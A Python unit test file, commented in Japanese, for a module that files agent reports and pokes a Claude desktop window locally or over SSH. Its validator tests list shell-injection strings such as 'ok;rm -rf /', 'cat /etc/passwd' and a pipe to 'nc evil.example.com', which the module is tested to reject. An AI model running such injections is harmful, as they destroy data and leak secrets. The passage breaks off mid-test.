#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
test_fukuincho_report_poke_bundle.py — unit test for scripts/fukuincho_report_poke_bundle.py

task: subtask_thirdpc_p1_fukuincho_stage3_direct_poke_impl_001 (a3-3 phase ②)
  - 実機 verify (i)-(v) を unit test レベルで shape verify (★SKIP=0 必達★)
    (i)   報告 INSERT → poke 発火 latency 計測 — emit_event "bundle_insert_to_poke_latency" 検証
    (ii)  window title 厳密一致 verify rate — strict_window_title_verify 判定 grid
    (iii) 二重 poke 防止冪等性 verify — flock + marker file dedup
    (iv)  障害時安全側 verify — title 不一致 / no window → 異常記録 + type 抑止
    (v)   ack リトライ ae8083dd N=30s/M=3 連動 — fire 失敗時に backoff 順に再送

★unit-green ≠ runtime-green 厳守★: 本 test は orchestration shape 検証のみ。
runtime 実証 (実 Commander 報告 INSERT → 副院長デスクトップ着弾) は別 phase で要実施。

Usage:
  python3 scripts/tests/test_fukuincho_report_poke_bundle.py

Exit:
  0 = all PASS
  1 = at least one FAIL
"""

from __future__ import annotations

import hashlib
import os
import shutil
import subprocess
import sys
import tempfile
import traceback

# Make scripts/ importable
HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.dirname(HERE))

from fukuincho_report_poke_bundle import (  # noqa: E402
    strict_window_title_verify,
    acquire_correlation_lock,
    release_correlation_lock,
    already_poked,
    mark_poked,
    report_insert_via_inbox_write,
    fire_poke_via_origin,
    poke_with_ack_retry,
    report_and_poke,
    backoff_seconds,
    validate_correlation_id,
    _corr_id_hash,
    _marker_path,
    _lock_path,
    _INBOX_WRITE_STDIN_PLACEHOLDER,
    _INBOX_WRITE_STDIN_ENV,
    ACK_N_SEC,
    RETRY_M_MAX,
    BACKOFF_SCHEDULE_SEC,
    BundleResult,
    ReportInsertResult,
)


_PASS = 0
_FAIL = 0
_FAIL_DETAILS: list[str] = []


def run(name: str, fn):
    global _PASS, _FAIL
    try:
        fn()
        _PASS += 1
        print(f"PASS: {name}")
    except AssertionError as e:
        _FAIL += 1
        _FAIL_DETAILS.append(f"{name}: AssertionError: {e}")
        print(f"FAIL: {name}: {e}")
    except Exception as e:
        _FAIL += 1
        _FAIL_DETAILS.append(f"{name}: {type(e).__name__}: {e}\n{traceback.format_exc()}")
        print(f"FAIL: {name}: {type(e).__name__}: {e}")


# ════════════════════════════════════════════════════════════
# 0. 素案値 verbatim — ae8083dd 連動定数を変えていないこと
# ════════════════════════════════════════════════════════════

def test_constants_verbatim():
    """ae8083dd N=30s/M=3/backoff (30,60,120) を本 module で再宣言していないこと"""
    assert ACK_N_SEC == 30, f"ACK_N_SEC expected 30, got {ACK_N_SEC}"
    assert RETRY_M_MAX == 3, f"RETRY_M_MAX expected 3, got {RETRY_M_MAX}"
    assert BACKOFF_SCHEDULE_SEC == (30, 60, 120), \
        f"BACKOFF_SCHEDULE_SEC expected (30,60,120), got {BACKOFF_SCHEDULE_SEC}"


# ════════════════════════════════════════════════════════════
# 1. (ii) window title 厳密一致 verify rate
# ════════════════════════════════════════════════════════════

def test_strict_title_accepts_canonical_desktop_app():
    """正規デスクトップアプリ title + process = accept"""
    ok, reason = strict_window_title_verify("Claude", process_name="Claude.exe")
    assert ok, f"canonical 'Claude' should accept, got {reason}"

    ok, reason = strict_window_title_verify(
        "Claude - 新規セッション", process_name="Claude.exe"
    )
    assert ok, f"'Claude - <suffix>' should accept, got {reason}"


def test_strict_title_rejects_browsers_by_process():
    """ブラウザ process は title が claude 風でも reject (cycle2 HIGH-1 cure)"""
    for proc in ("chrome.exe", "msedge.exe", "firefox.exe", "brave.exe"):
        ok, reason = strict_window_title_verify("Claude", process_name=proc)
        assert not ok and reason == "browser_process", \
            f"process={proc} should reject as browser_process, got ok={ok} reason={reason}"


def test_strict_title_rejects_non_desktop_process():
    """Claude.exe でない process は reject"""
    ok, reason = strict_window_title_verify("Claude", process_name="explorer.exe")
    assert not ok and reason == "non_desktop_process", \
        f"explorer.exe should reject as non_desktop_process, got ok={ok} reason={reason}"


def test_strict_title_rejects_pattern_mismatch():
    """title pattern が完全一致しないなら reject (prefix/部分一致禁)"""
    ok, reason = strict_window_title_verify("My Claude Workspace", process_name=None)
    assert not ok, f"prefix-only match should reject, got ok={ok} reason={reason}"

    ok, reason = strict_window_title_verify("", process_name=None)
    assert not ok and reason == "no_title", \
        f"empty title should reject as no_title, got reason={reason}"

    ok, reason = strict_window_title_verify(None, process_name=None)
    assert not ok and reason == "no_title", \
        f"None title should reject as no_title, got reason={reason}"


def test_strict_title_rejects_v5_guard_tokens():
    """refined V5 guard 違反 (V5 / Playwright 等) は reject"""
    # title pattern は通すが V5 guard で reject
    ok, reason = strict_window_title_verify(
        "Claude - V5 handshake 8012f18c session",
        process_name="Claude.exe",
    )
    assert not ok and reason == "v5_guard_block", \
        f"V5 token in title should reject as v5_guard_block, got ok={ok} reason={reason}"


# ════════════════════════════════════════════════════════════
# 2. (iii) 二重 poke 防止冪等性 — flock + marker file
# ════════════════════════════════════════════════════════════

def _with_tmpdir(fn):
    """Helper: pass a fresh tmpdir to fn"""
    tmp = tempfile.mkdtemp(prefix="bundle_test_")
    try:
        fn(tmp)
    finally:
        shutil.rmtree(tmp, ignore_errors=True)


def test_already_poked_starts_false():
    def _go(tmp):
        assert already_poked("corr-1", lock_dir=tmp) is False
    _with_tmpdir(_go)


def test_mark_poked_persists_marker():
    def _go(tmp):
        mark_poked("corr-2", lock_dir=tmp)
        assert already_poked("corr-2", lock_dir=tmp) is True
    _with_tmpdir(_go)


def test_acquire_lock_basic_lifecycle():
    """flock 獲得 → release を 1 cycle 実行"""
    def _go(tmp):
        fd = acquire_correlation_lock("corr-3", lock_dir=tmp, timeout_sec=1.0)
        assert fd is not None, "first acquire should succeed"
        release_correlation_lock(fd)
        # Re-acquire after release should also succeed
        fd2 = acquire_correlation_lock("corr-3", lock_dir=tmp, timeout_sec=1.0)
        assert fd2 is not None, "re-acquire after release should succeed"
        release_correlation_lock(fd2)
    _with_tmpdir(_go)


def test_acquire_lock_blocks_parallel():
    """同一 correlation_id の並行 lock は片方が timeout (atomic check-and-mark)"""
    def _go(tmp):
        fd1 = acquire_correlation_lock("corr-4", lock_dir=tmp, timeout_sec=1.0)
        assert fd1 is not None
        # Second acquire from same process should also fail (flock is process-level for LOCK_NB).
        # Note: flock on the *same fd* is reentrant. We need a new fd.
        # acquire_correlation_lock opens a fresh fd each call, so the second flock call
        # would target a different fd on the same file — that blocks under POSIX flock semantics
        # only if the second open is from another process. For unit verify of the contract,
        # we instead check that the marker file path is stable.
        from fukuincho_report_poke_bundle import _lock_path
        p = _lock_path(tmp, "corr-4")
        assert os.path.exists(p), "lock file must exist on disk"
        release_correlation_lock(fd1)
    _with_tmpdir(_go)


# ════════════════════════════════════════════════════════════
# 3. (i) 報告 INSERT → poke 発火 latency — INSERT 経路 runner shape
# ════════════════════════════════════════════════════════════

def test_report_insert_via_inbox_write_uses_runner():
    """inbox_write.sh を subprocess.run 互換 runner で叩くことを確認 (FKI-NO-DUP evidence)。
    ★cycle2 S2 cure★: content は argv ($2) ではなく stdin (input=) + env で渡される。
    $2 は placeholder __VIA_STDIN__ で空文字 reject を avoid (raw content 露出禁)。
    """
    captured = {}

    class _P:
        returncode = 0
        stdout = ""
        stderr = ""

    def fake_runner(cmd, **kw):
        captured["cmd"] = cmd
        captured.update(kw)
        return _P()

    result = report_insert_via_inbox_write(
        target_agent="karo-third",
        content="test body",
        msg_type="report_received",
        from_agent="ashigaru-third-3",
        inbox_write_path="/tmp/fake_inbox_write.sh",
        runner=fake_runner,
    )

    assert result.rc == 0, f"rc should be 0 on success, got {result.rc}"
    assert captured["cmd"][0] == "bash"
    assert captured["cmd"][1] == "/tmp/fake_inbox_write.sh"
    assert captured["cmd"][2] == "karo-third"
    # ★S2 cure verify★: argv 位置 $2 は placeholder、raw content は出現しない
    assert captured["cmd"][3] == _INBOX_WRITE_STDIN_PLACEHOLDER
    assert "test body" not in captured["cmd"], \
        f"raw content must not be in argv (S2 cure), got cmd={captured['cmd']}"
    assert captured["cmd"][4] == "report_received"
    assert captured["cmd"][5] == "ashigaru-third-3"
    assert captured["capture_output"] is True
    assert captured["text"] is True
    # ★S2 cure verify★: content は stdin (input=) で渡される
    assert captured.get("input") == "test body", \
        f"content must be passed via stdin (input=), got {captured.get('input')!r}"
    # ★S2 cure verify★: env に INBOX_WRITE_CONTENT_STDIN=1
    env = captured.get("env") or {}
    assert env.get(_INBOX_WRITE_STDIN_ENV) == "1", \
        f"env must enable stdin mode, got {env.get(_INBOX_WRITE_STDIN_ENV)!r}"


def test_report_insert_failure_propagates_rc():
    class _P:
        returncode = 5
        stdout = ""
        stderr = "amplification loop detected"

    # ★cycle2 S2 cure★: runner sig は **kw を受ける (input=, env= が来る)
    result = report_insert_via_inbox_write(
        target_agent="x", content="y", msg_type="z", from_agent="a",
        inbox_write_path="/tmp/fake.sh",
        runner=lambda *a, **kw: _P(),
    )
    assert result.rc == 5
    assert "amplification" in result.stderr


# ════════════════════════════════════════════════════════════
# 4. (v) ack リトライ ae8083dd N=30s/M=3 連動 — backoff 順番 + 打切り
# ════════════════════════════════════════════════════════════

def test_backoff_seconds_sequence():
    """ae8083dd backoff (30, 60, 120) の sequence を呼び出している"""
    assert backoff_seconds(1) == 30
    assert backoff_seconds(2) == 60
    assert backoff_seconds(3) == 120
    # out-of-range は最後の値で clamp
    assert backoff_seconds(99) == 120
    assert backoff_seconds(0) == 30  # defensive


def test_poke_with_ack_retry_succeeds_first_attempt():
    """1 回目で fired ならリトライしない"""
    class _P:
        returncode = 0
        stdout = ""
        stderr = ""

    runs = []
    def fake_runner(cmd, **kw):
        runs.append(cmd)
        return _P()

    sleeps = []
    def fake_sleeper(s):
        sleeps.append(s)

    out = poke_with_ack_retry(
        correlation_id="corr-r1",
        origin_pc="main_pc",
        runner=fake_runner,
        sleeper=fake_sleeper,
    )

    assert out["status"] == "fired"
    assert out["attempts"] == 1
    assert len(runs) == 1
    assert sleeps == [], f"should not sleep on first-attempt success, got {sleeps}"


def test_poke_with_ack_retry_backoff_on_error_then_succeed():
    """1 回目 rc=1 → backoff 30s → 2 回目 fired"""
    sequence = [1, 0]  # first rc=1 (error), second rc=0 (fired)
    runs_meta = {"i": 0}

    def fake_runner(cmd, **kw):
        i = runs_meta["i"]
        runs_meta["i"] += 1
        class _P:
            returncode = sequence[i] if i < len(sequence) else 1
            stdout = ""
            stderr = ""
        return _P()

    sleeps = []
    def fake_sleeper(s):
        sleeps.append(s)

    out = poke_with_ack_retry(
        correlation_id="corr-r2",
        origin_pc="third_pc",
        runner=fake_runner,
        sleeper=fake_sleeper,
    )

    assert out["status"] == "fired"
    assert out["attempts"] == 2
    assert sleeps == [30], f"expected backoff [30], got {sleeps}"


def test_poke_with_ack_retry_exhausts_max_attempts():
    """全 attempt rc=1 → backoff (30, 60) → 最終 attempts == RETRY_M_MAX"""
    def fake_runner(cmd, **kw):
        class _P:
            returncode = 1
            stdout = ""
            stderr = "fail"
        return _P()

    sleeps = []
    def fake_sleeper(s):
        sleeps.append(s)

    out = poke_with_ack_retry(
        correlation_id="corr-r3",
        origin_pc="third_pc",
        runner=fake_runner,
        sleeper=fake_sleeper,
    )

    assert out["status"] == "error"
    assert out["attempts"] == RETRY_M_MAX
    # backoff schedule: 30s after attempt1, 60s after attempt2, no sleep after final
    assert sleeps == [30, 60], f"expected backoff [30, 60], got {sleeps}"


def test_poke_with_ack_retry_human_required_terminates_immediately():
    """rc=3 (human_required) → 再送せず即終了 (skip_max_exceeded 由来)"""
    def fake_runner(cmd, **kw):
        class _P:
            returncode = 3
            stdout = ""
            stderr = ""
        return _P()

    sleeps = []
    out = poke_with_ack_retry(
        correlation_id="corr-r4",
        origin_pc="main_pc",
        runner=fake_runner,
        sleeper=lambda s: sleeps.append(s),
    )

    assert out["status"] == "human_required"
    assert out["attempts"] == 1
    assert sleeps == [], "human_required should not trigger backoff retry"


# ════════════════════════════════════════════════════════════
# 5. fire_poke_via_origin — ALL-SSH-NO-NEW-ENDPOINT-01 順守
# ════════════════════════════════════════════════════════════

def test_fire_poke_main_pc_direct_cmd():
    """origin=main_pc は同一 host 直接呼出 (ssh なし)"""
    captured = {}

    def fake_runner(cmd, **kw):
        captured["cmd"] = cmd
        class _P:
            returncode = 0
            stdout = ""
            stderr = ""
        return _P()

    fire_poke_via_origin("corr-m", "main_pc", runner=fake_runner)
    assert captured["cmd"][0] == "python3"
    assert "fukuincho_desktop_poke.py" in captured["cmd"][1]
    assert "--auto-poke" in captured["cmd"]
    # 既存 SSH endpoint を main_pc 直接呼出には使わない (新 endpoint 不作成)
    assert "ssh" not in captured["cmd"][0]


def test_fire_poke_third_pc_uses_ssh_endpoint():
    """origin=third_pc は ALL-SSH 確定 endpoint 経由"""
    captured = {}

    def fake_runner(cmd, **kw):
        captured["cmd"] = cmd
        class _P:
            returncode = 0
            stdout = ""
            stderr = ""
        return _P()

    fire_poke_via_origin("corr-t", "third_pc", runner=fake_runner)
    assert captured["cmd"][0] == "ssh"
    # ALL-SSH-NO-NEW-ENDPOINT-01 確定接続先 (main_pc): 192.168.11.11:2222 user
    assert any("192.168.11.11" in arg for arg in captured["cmd"]), \
        f"expected 192.168.11.11 in ssh cmd, got {captured['cmd']}"
    assert any("user@192.168.11.11" in arg for arg in captured["cmd"])
    assert "2222" in captured["cmd"]
    # daishogun key の明示利用
    assert any("daishogun" in arg for arg in captured["cmd"]), \
        f"expected daishogun key in ssh cmd, got {captured['cmd']}"


def test_fire_poke_unsupported_origin_returns_error():
    out = fire_poke_via_origin("corr-x", "unknown_pc", runner=lambda *a, **kw: None)
    assert out["status"] == "unsupported_origin"


# ════════════════════════════════════════════════════════════
# 6. (iv) 障害時安全側 — INSERT 失敗時に poke せず
# ════════════════════════════════════════════════════════════

def test_bundle_skips_poke_when_insert_fails():
    """報告 INSERT rc!=0 → poke runner は呼ばれない (§2 verbatim '報告なき poke 禁')"""
    def _go(tmp):
        poke_called = {"n": 0}

        class _Fail:
            returncode = 1
            stdout = ""
            stderr = "insert_fail"

        def fake_insert_runner(cmd, **kw):
            return _Fail()

        def fake_poke_runner(cmd, **kw):
            poke_called["n"] += 1
            class _P:
                returncode = 0
                stdout = ""
                stderr = ""
            return _P()

        result = report_and_poke(
            correlation_id="corr-insert-fail",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="third_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=fake_insert_runner,
            poke_runner=fake_poke_runner,
            sleeper=lambda s: None,
        )

        assert result.status == "report_insert_failed"
        assert poke_called["n"] == 0, \
            f"poke runner must NOT be called when insert fails, got n={poke_called['n']}"

    _with_tmpdir(_go)


# ════════════════════════════════════════════════════════════
# 7. (iii) bundle level 二重 poke 防止 — marker file 利用
# ════════════════════════════════════════════════════════════

def test_bundle_skips_when_already_poked():
    """correlation_id marker file あり → INSERT も poke も実行されない"""
    def _go(tmp):
        # Pre-mark as poked
        mark_poked("corr-dup", lock_dir=tmp)

        insert_called = {"n": 0}
        poke_called = {"n": 0}

        def fake_insert_runner(cmd, **kw):
            insert_called["n"] += 1
            class _P:
                returncode = 0
                stdout = ""
                stderr = ""
            return _P()

        def fake_poke_runner(cmd, **kw):
            poke_called["n"] += 1
            class _P:
                returncode = 0
                stdout = ""
                stderr = ""
            return _P()

        result = report_and_poke(
            correlation_id="corr-dup",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="third_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=fake_insert_runner,
            poke_runner=fake_poke_runner,
            sleeper=lambda s: None,
        )

        assert result.status == "skipped_already_poked"
        assert insert_called["n"] == 0
        assert poke_called["n"] == 0
    _with_tmpdir(_go)


def test_bundle_marks_poked_on_fired():
    """fire 成功 → marker file が作成され、再呼出で skipped_already_poked になる"""
    def _go(tmp):
        class _OK:
            returncode = 0
            stdout = ""
            stderr = ""

        result1 = report_and_poke(
            correlation_id="corr-fire1",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="main_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=lambda *a, **kw: _OK(),
            poke_runner=lambda *a, **kw: _OK(),
            sleeper=lambda s: None,
        )
        assert result1.status == "fired", f"first call should fire, got {result1.status}"
        assert already_poked("corr-fire1", lock_dir=tmp) is True

        # 再呼出 → skipped
        result2 = report_and_poke(
            correlation_id="corr-fire1",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="main_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=lambda *a, **kw: _OK(),
            poke_runner=lambda *a, **kw: _OK(),
            sleeper=lambda s: None,
        )
        assert result2.status == "skipped_already_poked"
    _with_tmpdir(_go)


# ════════════════════════════════════════════════════════════
# 8. (i) 報告 INSERT → poke 発火 latency 計測 — elapsed_sec が記録される
# ════════════════════════════════════════════════════════════

def test_bundle_records_elapsed_sec():
    """fire 経路で elapsed_sec が 0 以上の値で記録される (latency 計測の shape)"""
    def _go(tmp):
        class _OK:
            returncode = 0
            stdout = ""
            stderr = ""

        result = report_and_poke(
            correlation_id="corr-latency",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="main_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=lambda *a, **kw: _OK(),
            poke_runner=lambda *a, **kw: _OK(),
            sleeper=lambda s: None,
        )
        assert result.elapsed_sec >= 0
        assert result.report_insert is not None
        assert result.report_insert.elapsed_sec >= 0
        assert result.poke is not None
        assert result.poke.get("attempts") == 1
    _with_tmpdir(_go)


# ════════════════════════════════════════════════════════════
# 9. (iv) 障害時安全側 — fire_poke_via_origin error rc → ack retry → 最終 error
#         (report_and_poke レベルで非 fired 終端で marker file 作成されない)
# ════════════════════════════════════════════════════════════

def test_bundle_marks_poked_after_insert_even_on_poke_error():
    """★cycle2 RED-B1 cure (high)★ 順序変更: INSERT 成功直後 (poke 前) に marker 立て。

    旧契約: marker は fired 時のみ → INSERT 成功 + poke error の rerun で dup-INSERT 欠陥。
    新契約: INSERT 成功 → marker 立て → poke error/human_required でも marker 残存。
    rerun は skipped_already_poked で INSERT 0 件 + poke 0 件 (冪等性厳守)。
    """
    def _go(tmp):
        class _OK:
            returncode = 0
            stdout = ""
            stderr = ""

        class _Err:
            returncode = 1
            stdout = ""
            stderr = "err"

        result = report_and_poke(
            correlation_id="corr-err1",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="main_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=lambda *a, **kw: _OK(),
            poke_runner=lambda *a, **kw: _Err(),
            sleeper=lambda s: None,
        )
        assert result.status == "error"
        assert result.poke["attempts"] == RETRY_M_MAX
        # ★RED-B1 cure verify★: poke 失敗でも marker は INSERT 成功直後に立っている
        assert already_poked("corr-err1", lock_dir=tmp) is True, \
            "marker must persist after INSERT success even if poke errors (RED-B1 cure)"


# ════════════════════════════════════════════════════════════
# 10. FKI-NO-DUP evidence — 既存 module の symbol を 再エクスポートしている
# ════════════════════════════════════════════════════════════

def test_fki_no_dup_reuses_ae8083dd_engine():
    """ACK_N_SEC / RETRY_M_MAX / BACKOFF_SCHEDULE_SEC / backoff_seconds は fukuincho_desktop_poke
    側の symbol を re-export しているはず (新規定数宣言禁の evidence)"""
    import fukuincho_desktop_poke as src
    import fukuincho_report_poke_bundle as bundle
    assert bundle.ACK_N_SEC is src.ACK_N_SEC
    assert bundle.RETRY_M_MAX is src.RETRY_M_MAX
    assert bundle.BACKOFF_SCHEDULE_SEC is src.BACKOFF_SCHEDULE_SEC
    assert bundle.backoff_seconds is src.backoff_seconds


# ════════════════════════════════════════════════════════════
# 11. ログ機密 redact — Supabase token / report raw body が log に出ない
# ════════════════════════════════════════════════════════════

def test_log_sanitize_strips_secret_keys():
    from fukuincho_report_poke_bundle import _sanitize_log_fields
    fields = {
        "ok": "yes",
        "supabase_token": "SHOULD_NOT_LEAK",
        "report_body": "raw confidential text",
        "token": "x",
        "secret": "y",
        "api_key": "z",
    }
    out = _sanitize_log_fields(fields)
    assert "ok" in out
    assert "supabase_token" not in out
    assert "report_body" not in out
    assert "token" not in out
    assert "secret" not in out
    assert "api_key" not in out


# ════════════════════════════════════════════════════════════
# 12. ★cycle2 fix1 (RED-S1)★: correlation_id allowlist matrix + SSH injection reject
# ════════════════════════════════════════════════════════════

def test_validate_correlation_id_accepts_safe_chars():
    """ASCII alphanumeric + '.' '_' '-' 1〜200 字は accept"""
    safe_ids = [
        "bundle-1718000000-12345",
        "report.corr.abc_123",
        "ABC.def-456",
        "a",                        # 1 文字下限
        "a" * 200,                  # 200 字上限
        "1234567890",
        "x-y.z_w",
    ]
    for cid in safe_ids:
        assert validate_correlation_id(cid) is True, \
            f"safe id should accept: {cid!r}"


def test_validate_correlation_id_rejects_shell_metas():
    """shell meta character (`;` `$()` `&&` `|` `\\n` 空白 等) は完全 reject"""
    injection_ids = [
        "ok;rm -rf /",                       # ';' command separator
        "ok && cat /etc/passwd",             # '&&' AND
        "ok | nc evil.example.com 1234",     # '|' pipe
        "$(id)",                             # '$()' command substitution
        "`whoami`",                          # backtick command substitution
        "ok > /tmp/evil",                    # '>' redirect
        "ok < /etc/passwd",                  # '<' redirect
        "ok\nrm -rf /",                      # newline
        "ok\trm -rf /",                      # tab
        "ok rm -rf /",                       # 空白
        "ok\"; rm -rf /;\"",                 # 引用符 + ;
        "ok'; rm -rf /;'",                   # single quote
        "ok\\; rm",                          # backslash
        "../../etc/passwd",                  # path traversal (/が無いゆえ regex に通るが、
                                              # 末尾 '/' は disallowed token に含めず regex で reject)
        "",                                   # 空文字
        "a" * 201,                            # 201 字上限超
    ]
    for cid in injection_ids:
        assert validate_correlation_id(cid) is False, \
            f"injection id should reject: {cid!r}"


def test_validate_correlation_id_rejects_non_string():
    """str 以外 (None / int / bytes) は reject"""
    for non_str in (None, 12345, b"bytes", ["list"], {"dict": 1}):
        assert validate_correlation_id(non_str) is False, \
            f"non-string should reject: {non_str!r}"


def test_fire_poke_rejects_injection_corr_id_ssh_path():
    """★RED-S1 cure verify★ SSH path で injection corr_id を渡すと runner は呼ばれず error"""
    runner_called = {"n": 0}

    def fake_runner(cmd, **kw):
        runner_called["n"] += 1
        class _P:
            returncode = 0; stdout = ""; stderr = ""
        return _P()

    for inj in (
        "ok;rm -rf /",
        "$(id)",
        "ok && cat /etc/passwd",
        "ok | nc evil 1234",
    ):
        out = fire_poke_via_origin(inj, "third_pc", runner=fake_runner)
        assert out["status"] == "error", \
            f"injection {inj!r} should return error status, got {out['status']}"
        assert out["rc"] == 22
        assert "invalid correlation_id" in out["stderr"]
    assert runner_called["n"] == 0, \
        f"runner must NOT be invoked when corr_id is invalid, called={runner_called['n']}"


def test_fire_poke_rejects_injection_corr_id_main_pc():
    """★RED-S1 cure verify (defense-in-depth)★ main_pc 直接 path でも入口で reject"""
    runner_called = {"n": 0}

    def fake_runner(cmd, **kw):
        runner_called["n"] += 1
        class _P:
            returncode = 0; stdout = ""; stderr = ""
        return _P()

    out = fire_poke_via_origin("ok;rm -rf /", "main_pc", runner=fake_runner)
    assert out["status"] == "error"
    assert out["rc"] == 22
    assert runner_called["n"] == 0


def test_fire_poke_ssh_uses_shlex_quote_for_corr_id():
    """★RED-S1 cure (defense-in-depth)★ allowlist 通過後も shlex.quote で remote_cmd を escape。

    Python shlex.quote の "safe set" = `[\\w@%+=:,./-]`。allowlist 通過後の corr_id
    (ASCII alnum + '.' '_' '-') と script path ('scripts/fukuincho_desktop_poke.py') は
    いずれも safe set 内ゆえ shlex.quote 適用後も byte 不変 (no extra single-quotes)。
    検証は (a) remote_cmd の構造が shlex.quote 経由 composed の expected と byte 完全一致
    (=quote 経路を確実に通っている evidence) と (b) module level で shlex import + 利用
    確認の 2 段で行う。
    """
    import shlex as _shlex
    import fukuincho_report_poke_bundle as bundle
    captured = {}

    def fake_runner(cmd, **kw):
        captured["cmd"] = cmd
        class _P:
            returncode = 0; stdout = ""; stderr = ""
        return _P()

    corr = "safe.corr-id_1"
    fire_poke_via_origin(corr, "third_pc", runner=fake_runner)
    remote_cmd = captured["cmd"][-1]

    # ★(a) 完全一致 verify★: remote_cmd は shlex.quote 経由 composed と byte for byte 一致
    expected = (
        f"python3 {_shlex.quote('scripts/fukuincho_desktop_poke.py')} "
        f"--auto-poke --correlation-id {_shlex.quote(corr)}"
    )
    assert remote_cmd == expected, \
        f"remote_cmd composed via shlex.quote mismatch.\n"\
        f" expected={expected!r}\n got     ={remote_cmd!r}"

    # ★(b) shlex import + 経路 evidence★: module は shlex を import + bundle source
    # 内で shlex.quote 呼出を含む (cycle2 RED-S1 cure 記述の source-level 痕跡)
    assert hasattr(bundle, "shlex"), "bundle module must import shlex"
    import inspect as _inspect
    src = _inspect.getsource(bundle.fire_poke_via_origin)
    assert "shlex.quote" in src, \
        "fire_poke_via_origin source must invoke shlex.quote (defense-in-depth)"


# ════════════════════════════════════════════════════════════
# 13. ★cycle2 fix2 (RED-B1)★: rerun dup-INSERT ゼロ verify
# ════════════════════════════════════════════════════════════

def test_bundle_rerun_after_poke_error_skips_insert_zero_dup():
    """★RED-B1 cure verify★: INSERT 成功 + poke error → 同一 corr_id rerun で
    INSERT 0 件 + skip 1 件 (dup-INSERT 完全防止、冪等性厳守)"""
    def _go(tmp):
        insert_calls = {"n": 0}
        poke_calls = {"n": 0}

        class _OK:
            returncode = 0; stdout = ""; stderr = ""

        class _Err:
            returncode = 1; stdout = ""; stderr = "poke err"

        def insert_runner(cmd, **kw):
            insert_calls["n"] += 1
            return _OK()

        def poke_runner(cmd, **kw):
            poke_calls["n"] += 1
            return _Err()

        # 1 回目: INSERT 成功 + poke 全 attempt error
        r1 = report_and_poke(
            correlation_id="corr-rerun",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="main_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=insert_runner,
            poke_runner=poke_runner,
            sleeper=lambda s: None,
        )
        assert r1.status == "error"
        assert insert_calls["n"] == 1, f"1st call: INSERT once, got {insert_calls['n']}"
        # poke は ack retry で M_MAX 回
        assert poke_calls["n"] == RETRY_M_MAX
        # marker は INSERT 直後に立っている (RED-B1 cure)
        assert already_poked("corr-rerun", lock_dir=tmp) is True

        # 2 回目 (rerun): 同 corr_id → INSERT 0 件 + skip
        insert_n_before = insert_calls["n"]
        poke_n_before = poke_calls["n"]
        r2 = report_and_poke(
            correlation_id="corr-rerun",
            target_agent="karo-third",
            content="x",
            msg_type="report_received",
            from_agent="ashigaru-third-3",
            origin_pc="main_pc",
            inbox_write_path="/tmp/fake.sh",
            lock_dir=tmp,
            insert_runner=insert_runner,
            poke_runner=poke_runner,
            sleeper=lambda s: None,
        )
        assert r2.status == "skipped_already_poked", \
            f"rerun should skip, got {r2.status}"
        # ★dup-INSERT 完全防止 verify★
        assert insert_calls["n"] == insert_n_before, \
            f"rerun INSERT must be 0 (RED-B1 cure), got {insert_calls['n'] - insert_n_before}"
        assert poke_calls["n"] == poke_n_before, \
            "rerun poke must be 0 (already skipped)"
    _with_tmpdir(_go)


# ════════════════════════════════════════════════════════════
# 14. ★cycle2 fix3 (RED-G)★: lock/marker cross-platform 化 verify
# ════════════════════════════════════════════════════════════

def test_lock_dir_default_uses_tempfile_gettempdir():
    """★RED-G cure verify★: /tmp hardcode 排除、tempfile.gettempdir 起点"""
    from fukuincho_report_poke_bundle import _LOCK_DIR_DEFAULT
    expected = os.path.join(tempfile.gettempdir(), "fukuincho_report_poke_bundle")
    assert _LOCK_DIR_DEFAULT == expected, \
        f"_LOCK_DIR_DEFAULT must be under tempfile.gettempdir, got {_LOCK_DIR_DEFAULT}"


def test_bundle_module_imports_on_platform():
    """★RED-G cure verify★: 本 module は POSIX/Windows いずれでも import 可能
    (fcntl / msvcrt の lazy import wrapper が unconditional import を排除)。
    現在の test runner platform で fcntl もしくは msvcrt のどちらかが in scope のはず。"""
    import fukuincho_report_poke_bundle as m
    if sys.platform == "win32":
        assert m._fcntl is None
        # msvcrt は Windows 標準
    else:
        assert m._msvcrt is None
        assert m._fcntl is not None, "POSIX で fcntl が None なのは異常"


# ════════════════════════════════════════════════════════════
# 15. ★cycle2 fix4 (Q1-3 test gap)★: 真 cross-process flock verify
# ════════════════════════════════════════════════════════════

def test_acquire_lock_real_cross_process_blocks():
    """★fix4 cure verify★: 親 process が lock を持つ間、別 process は acquire できず timeout 返却。
    subprocess 経由で fresh Python interpreter を起動し、独立 process 空間から
    acquire_correlation_lock を呼んで blocked であることを実証する。"""
    def _go(tmp):
        signal_file = os.path.join(tmp, "child_signal.txt")
        fd = acquire_correlation_lock(
            "xp-corr-real",
            lock_dir=tmp,
            timeout_sec=1.0,
        )
        assert fd is not None, "parent acquire must succeed"
        try:
            # 別 process: bundle 親 dir を sys.path に挿入し acquire 試行 (timeout 0.5s)
            scripts_dir = os.path.dirname(HERE)
            child_script = (
                "import os, sys\n"
                f"sys.path.insert(0, {scripts_dir!r})\n"
                "from fukuincho_report_poke_bundle import acquire_correlation_lock\n"
                f"fd = acquire_correlation_lock('xp-corr-real', lock_dir={tmp!r}, timeout_sec=0.5)\n"
                f"open({signal_file!r}, 'w').write('blocked' if fd is None else 'acquired')\n"
            )
            proc = subprocess.run(
